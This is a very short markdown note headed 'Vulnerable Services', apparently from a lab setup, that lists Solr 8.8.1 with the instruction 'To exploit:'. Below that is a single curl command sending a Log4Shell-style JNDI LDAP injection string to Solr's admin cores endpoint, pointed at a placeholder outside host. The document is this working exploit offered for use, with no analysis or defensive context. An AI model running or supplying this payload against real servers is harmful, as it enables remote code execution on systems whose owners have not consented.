# Vulnerable Services

## solr 8.8.1

To exploit:

```
curl 'http://SOLR_SERVER_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://TARGET_IP:8080/PATH\}'
```
